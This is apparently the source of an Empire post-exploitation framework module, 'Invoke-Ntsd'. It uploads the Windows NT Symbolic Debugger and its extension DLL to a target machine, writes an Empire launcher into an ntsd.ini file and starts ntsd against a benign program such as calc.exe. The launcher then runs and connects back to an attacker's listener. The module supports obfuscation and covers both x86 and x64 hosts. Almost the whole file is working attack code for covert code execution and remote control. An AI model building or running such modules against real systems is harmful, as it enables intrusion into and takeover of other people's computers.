from lib.common import helpers
import base64

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-Ntsd',

            'Author': ['james fitts'],

            'Description': ("Use NT Symbolic Debugger to execute Empire launcher code"),

            'Background' : True,

            'OutputExtension' : None,
            
            'NeedsAdmin' : False,

            'OpsecSafe' : False,
            
            'Language' : 'powershell',

            'MinLanguageVersion' : '2',
            
            'Comments': [""]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'   :   'Agent to run module on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UploadPath'  : {
                'Description'   :   'Path to drop dll (C:\Users\Administrator\Desktop).',
                'Required'      :   False,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'UserAgent' : {
                'Description'   :   'User-agent string to use for the staging request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
            'Proxy' : {
                'Description'   :   'Proxy to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            },
						'BinPath' : {
								'Description'		:		'Binary to set NTSD to debug.',
								'Required'			:		True,
								'Value'					:		"C:\\Windows\\System32\\calc.exe"
						},
            'Arch' : {
                'Description'   :   'Architecture the system is on.',
                'Required'      :   True,
                'Value'         :   'x64'
            },
            'ProxyCreds' : {
                'Description'   :   'Proxy credentials ([domain\]username:password) to use for request (default, none, or other).',
                'Required'      :   False,
                'Value'         :   'default'
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self, obfuscate=False, obfuscationCommand=""):

        listenerName = self.options['Listener']['Value']
        uploadPath = self.options['UploadPath']['Value'].strip()
        bin = self.options['BinPath']['Value']
        arch = self.options['Arch']['Value']
        ntsd_exe_upload_path = uploadPath + "\\" + "ntsd.exe"
        ntsd_dll_upload_path = uploadPath + "\\" + "ntsdexts.dll"

        # staging options
        userAgent = self.options['UserAgent']['Value']
        proxy = self.options['Proxy']['Value']
        proxyCreds = self.options['ProxyCreds']['Value']

        if arch == 'x64':
				  ntsd_exe = self.mainMenu.installPath + "data/module_source/code_execution/ntsd_x64.exe"
				  ntsd_dll = self.mainMenu.installPath + "data/module_source/code_execution/ntsdexts_x64.dll"
        elif arch == 'x86':
          ntsd_exe = self.mainMenu.installPath + "data/module_source/code_execution/ntsd_x86.exe"
          ntsd_dll = self.mainMenu.installPath + "data/module_source/code_execution/ntsdexts_x86.dll"

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "data/module_source/code_execution/Invoke-Ntsd.ps1"
        if obfuscate:
          helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
          moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
        try:
          f = open(moduleSource, 'r')
        except:
          print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
          return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode
        scriptEnd = ""
        if not self.mainMenu.listeners.is_listener_valid(listenerName):
          # not a valid listener, return nothing for the script
          print helpers.color("[!] Invalid listener: %s" %(listenerName))
          return ''
        else:

          l = self.mainMenu.stagers.stagers['multi/launcher']
          l.options['Listener']['Value'] = self.options['Listener']['Value']
          l.options['UserAgent']['Value'] = self.options['UserAgent']['Value']
          l.options['Proxy']['Value'] = self.options['Proxy']['Value']
          l.options['ProxyCreds']['Value'] = self.options['ProxyCreds']['Value']
          launcher = l.generate()

          if launcher == '':
            print helpers.color('[!] Error in launcher generation.')
            return ''
          else:
           launcherCode = launcher.split(' ')[-1]

           with open(ntsd_exe, 'rb') as bin_data:
             ntsd_exe_data = bin_data.read()

           with open(ntsd_dll, 'rb') as bin_data:
             ntsd_dll_data = bin_data.read()

           exec_write = "Write-Ini %s \"%s\"" % (uploadPath, launcher)
           code_exec = "%s\\ntsd.exe -cf %s\\ntsd.ini %s" % (uploadPath, uploadPath, bin)
           ntsd_exe_upload = self.mainMenu.stagers.generate_upload(ntsd_exe_data, ntsd_exe_upload_path)
           ntsd_dll_upload = self.mainMenu.stagers.generate_upload(ntsd_dll_data, ntsd_dll_upload_path)

           script += "\r\n"
           script += ntsd_exe_upload
           script += ntsd_dll_upload
           script += "\r\n"
           script += exec_write
           script += "\r\n"
           # this is to make sure everything was uploaded properly
           script += "Start-Sleep -s 5"
           script += "\r\n"
           script += code_exec

           return script
